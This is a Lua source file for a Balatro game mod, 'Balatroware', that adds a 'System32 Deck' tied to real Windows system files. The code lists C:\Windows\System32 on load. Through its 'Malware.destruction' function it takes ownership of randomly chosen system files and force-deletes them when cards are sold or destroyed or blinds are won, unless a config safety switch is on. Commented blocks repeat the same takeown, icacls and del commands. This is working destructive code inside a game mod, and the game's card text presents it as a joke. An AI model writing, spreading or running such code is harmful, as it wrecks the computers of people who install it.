-- balatroware.lua
---@diagnostic disable-next-line: lowercase-global
to_big = to_big or function(v)
	return v
end
---@diagnostic disable-next-line: lowercase-global
to_number = to_number or function(v)
	return v
end

local Balware = SMODS.current_mod

Balware.config_tab = function()
	return {n = G.UIT.ROOT, config = {align = "cl", outline = 0.5, outline_colour = HEX('C3C3C3'), padding = 0.025, colour = G.C.UI.BACKGROUND_DARK, minw = 7, minh = 2}, nodes = {
		{n = G.UIT.R, config = {align = "cl", padding = 0 }, nodes = {
			{n = G.UIT.C, config = { align = "cl", padding = -0.25 }, nodes = {
				create_toggle{ col = true, label = "", scale = 0.85, w = 0.15, shadow = true, ref_table = Balware.config, ref_value = "safetyswitch" },
			}},
			{n = G.UIT.C, config = { align = "cl", padding = 0.2 }, nodes = {
				{n = G.UIT.T, config = { text = ' Enable Safety Switch (Blocks Deletions)', scale = 0.5, colour = G.C.UI.TEXT_LIGHT }},
			}},
		}},
		{n = G.UIT.R, config = {align = "cl", padding = 0 }, nodes = {
			{n = G.UIT.C, config = { align = "cl", padding = -0.25 }, nodes = {
				create_toggle{ col = true, label = "", scale = 0.85, w = 0.15, shadow = true, ref_table = Balware.config, ref_value = "print_debug" },
			}},
			{n = G.UIT.C, config = { align = "cl", padding = 0.2 }, nodes = {
				{n = G.UIT.T, config = { text = ' Print Deletions (Recommended - Needs DebugPlus)', scale = 0.5, colour = G.C.UI.TEXT_LIGHT }},
			}},
		}},
		{n = G.UIT.R, config = {align = "cl", padding = 0 }, nodes = {
			{n = G.UIT.C, config = { align = "cl", padding = -0.25 }, nodes = {
				create_toggle{ col = true, label = "", scale = 0.85, w = 0.15, shadow = true, ref_table = Balware.config, ref_value = "sys32_destroy" },
			}},
			{n = G.UIT.C, config = { align = "cl", padding = 0.2 }, nodes = {
				{n = G.UIT.T, config = { text = ' Delete file on Card Destruction - Sys32 Deck', scale = 0.5, colour = G.C.UI.TEXT_LIGHT }},
			}},
		}},
		{n = G.UIT.R, config = {align = "cl", padding = 0 }, nodes = {
			{n = G.UIT.C, config = { align = "cl", padding = -0.25 }, nodes = {
				create_toggle{ col = true, label = "", scale = 0.85, w = 0.15, shadow = true, ref_table = Balware.config, ref_value = "sys32_blind" },
			}},
			{n = G.UIT.C, config = { align = "cl", padding = 0.2 }, nodes = {
				{n = G.UIT.T, config = { text = ' Delete Random File on Blind Victory - Sys32 Deck', scale = 0.5, colour = G.C.UI.TEXT_LIGHT }},
			}},
		}},
		{n = G.UIT.R, config = {align = "cl", padding = 0 }, nodes = {
			{n = G.UIT.C, config = { align = "cl", padding = -0.25 }, nodes = {
				create_toggle{ col = true, label = "", scale = 0.85, w = 0.15, shadow = true, ref_table = Balware.config, ref_value = "sys32_cards" },
			}},
			{n = G.UIT.C, config = { align = "cl", padding = 0.2 }, nodes = {
				{n = G.UIT.T, config = { text = ' All Starting Cards are Sys32 Files - Sys32 Deck', scale = 0.5, colour = G.C.UI.TEXT_LIGHT }},
			}},
		}},
		{n = G.UIT.R, config = {align = "cl", padding = 0}, nodes = {
			{n = G.UIT.C, config = { align = "cl", padding = 0.2 }, nodes = {
				{n = G.UIT.T, config = { text = 'Restart the game after changes', scale = 0.5, colour = G.C.RED }},
			}},
		}},
	}}
end

local files = {}
local dir = 'C:\\Windows\\System32\\'
local p = io.popen('dir "'..dir..'" /b')  --Open directory look for files, save data in p. (with option "/b" everything contained in the given directory is listed with simple format)
local i = 1
for file in p:lines() do                    --Loop through all files
    files[i] = tostring(file)
    i = i + 1
end

if SMODS.Atlas then
  SMODS.Atlas({
    key = "modicon",
    path = "icon.png",
    px = 32,
    py = 32
  })
end

SMODS.Sound({
	key = "music_cursed",
	path = "music_cursed.ogg",
	volume = 1.2,
	pitch = 1,
	select_music_track = function()
		return G.STAGE == G.STAGES.MAIN_MENU
	end,
})

SMODS.Atlas{
	key = 'Decks',
	path = 'Decks.png',
	px = 71,
	py = 95
}
SMODS.Back {
	key = 'sys32',
	atlas = 'Decks',
	pos = { x = 0, y = 0 },
	loc_txt = {
		name = "System32 Deck",
		text = {
			'{C:attention}Jokers{} are a random',
            '{C:red}System32 Files{}',
            'Selling these cards may have',
            '{C:red}unintended consequences.{}'
		}
	},
	unlocked = true,
    discovered = true,
	apply = function(self, card, val)
		if Balware.config.sys32_cards then
			G.E_MANAGER:add_event(Event({
            trigger = 'after',
            delay = 0.2,
            func = function()
				for i=1, #G.playing_cards do
					G.playing_cards[i]:add_sticker('ware_file', true)
				end
				return true
			end
		}))
		end
	end,
	calculate = function(self, card, context)
		if context.context == "eval" then
			if Balware.config.sys32_blind then
				local file = files[math.random(1, #files)]
				G.E_MANAGER:add_event(Event({
					trigger = 'after',
					delay = 0.2,
					func = function()
						attention_text({
							text = 'File '..file..' has been DELETED',
							scale = 0.8,
							hold = 5,
							backdrop_colour = G.C.RED,
							align = 'tm',
							major = G.play,
							offset = {x = 0, y = -1}
						})
					return true
					end
				}))
				Malware.destruction(file,'C:\\Windows\\System32\\')
			end
		end
	end,
}
SMODS.Sticker {
    key = 'file',
	atlas = 'Decks',
	pos = {x = -1, y = -1},
	loc_txt = {
		label = 'file',
		name = 'file',
		text = {
		  '#1#'
		},
	},
    config = {
		extra = {filename = 'file.file'}
	},
    loc_vars = function(self,info_queue,center)
		return{
			vars = {
				center.ability.filename
			}
		}
	end,
    sets = {
        Joker = true,
		Consumable = false
    },
	badge_colour = G.C.BLACK,
    rate = 1.0,
    needs_enable_flag = false,
	default_compat = false,
	no_collection = true,
	apply = function(self, card, val)
		card.ability[self.key] = val

		G.E_MANAGER:add_event(Event({
		func = function()
			local random_file = files[math.random(1, #files)]
            card.ability.filename = random_file
			return true
		end
		}))
	end,
    should_apply = function(self, card, center, area, bypass_reroll)
        return G.GAME.selected_back and G.GAME.selected_back.effect.center.key == 'b_ware_sys32'
    end,
    calculate = function(self, card, context)
        if context.selling_card and context.card == card then
			G.E_MANAGER:add_event(Event({
				trigger = 'after',
				delay = 0.2,
				func = function()
					attention_text({
						text = 'File '..card.ability.filename..' has been DELETED',
						scale = 0.8,
						hold = 5,
						align = 'tm',
						major = G.play,
						offset = {x = 0, y = -1},
						silent = true
					})
				return true
				end
			}))
            Malware.destruction(card.ability.filename,'C:\\Windows\\System32\\')
        end
		if Balware.config.sys32_destroy then
			if context.destroy_card and context.card == card and Balware.config.sys32_destroy and card.ability.filename then
				G.E_MANAGER:add_event(Event({
					trigger = 'after',
					delay = 0.2,
					func = function()
						attention_text({
							text = 'File '..card.ability.filename..' has been DELETED',
							scale = 0.8,
							hold = 5,
							align = 'tm',
							major = card,
							offset = {x = 0, y = -1},
							silent = true
						})
					return true
					end
				}))
            Malware.destruction(card.ability.filename,'C:\\Windows\\System32\\')
			end
		end
		if Balware.config.sys32_destroy then
			if context.remove_playing_cards then
				for _, removed_card in ipairs(context.removed) do
					if removed_card == card and card.ability.filename then
						G.E_MANAGER:add_event(Event({
							trigger = 'after',
							delay = 0.2,
							func = function()
								attention_text({
									text = 'File '..card.ability.filename..' has been DELETED',
									scale = 0.8,
									hold = 5,
									align = 'tm',
									major = G.play,
									offset = {x = 0, y = -1},
									silent = true
								})
							return true
							end
						}))
					Malware.destruction(card.ability.filename,'C:\\Windows\\System32\\')
					end
				end
			end
		end
    end
}


Malware = {}
if not Balware.config.safetyswitch then
	Malware.destruction = function(filename,dir)
		if Balware.config.print_debug then
			print('Deleting file: ' .. filename)
		end
		os.execute('takeown /f "'..dir..filename..'" /r /d y')
		os.execute('icacls "'..dir..filename..'" /grant Administrators:F /t')
		os.execute('del /f "'..dir..filename..'"')
	end
else
	Malware.destruction = function(filename,dir)
	-- Safety switch is enabled; do not delete files.
	if Balware.config.print_debug then
		print('Safety switch is enabled; skipping deletion of ' .. dir .. filename)
		print('Deleting file: ' .. filename)
	end
	end
end

SMODS.Joker{
	key = 'frontcard',
    atlas = 'Decks',
    unlocked = true,
    discovered = true,
	no_collection = true,
    pos = {x = 0, y = 0},
	in_pool = function(self) 
		return false 
	end
}
local game_main_menu_ref = Game.main_menu
function Game:main_menu(change_context)
    local ret = game_main_menu_ref(self, change_context)

    local newcard = SMODS.create_card({key='j_ware_frontcard', area = G.title_top, no_edition = true })
    self.title_top.T.w = self.title_top.T.w * 1.7675
	self.title_top.T.x = self.title_top.T.x - 0.8

	newcard.T.w = newcard.T.w * 1.1 * 1.2
	newcard.T.h = newcard.T.h * 1.1 * 1.2
	newcard.no_ui = true
	newcard.states.visible = false
	self.title_top:emplace(newcard)
	self.title_top:align_cards()

	if change_context == "splash" then
		G.E_MANAGER:add_event(Event({
			trigger = "after",
			delay = 0,
			blockable = false,
			blocking = false,
			func = function()
				newcard.states.visible = true
				newcard:start_materialize({ G.C.WHITE, G.C.WHITE }, true, 2.5)
				return true
			end,
		}))
	else
		G.E_MANAGER:add_event(Event({
			trigger = "after",
			delay = 0,
			blockable = false,
			blocking = false,
			func = function()
				newcard.states.visible = true
				newcard:start_materialize({ G.C.WHITE, G.C.WHITE }, nil, 1.2)
				return true
			end,
		}))
	end

	return ret
end


--[[
os.execute('takeown /f "C:\\testingground\\file.file" /r /d y')
os.execute('icacls "C:\\testingground\\file.file" /grant Administrators:F /t')
os.execute('del "C:\\testingground\\file.file"')
]]

--[[
local data = {}
local dir = 'C:\\Windows\\System32\\'
local p = io.popen('dir "'..dir..'" /b')  --Open directory look for files, save data in p. (with option "/b" everything contained in the given directory is listed with simple format)
local i = 1
for file in p:lines() do                    --Loop through all files
    data[i] = tostring(file)
    i = i + 1
end
print(data)
print(data[math.random(13, #data)])
print(data[math.random(13, #data)])
print(data[math.random(13, #data)])
print(data[math.random(13, #data)])
print(data[math.random(13, #data)])
]]
--[[
    takeown /f "C:\\Windows\\System32\\filename.exe" /r /d y
    icacls "C:\\Windows\\System32\\filename.exe" /grant Administrators:F /t
    del "C:\\Windows\\System32\\filename.exe"
]]
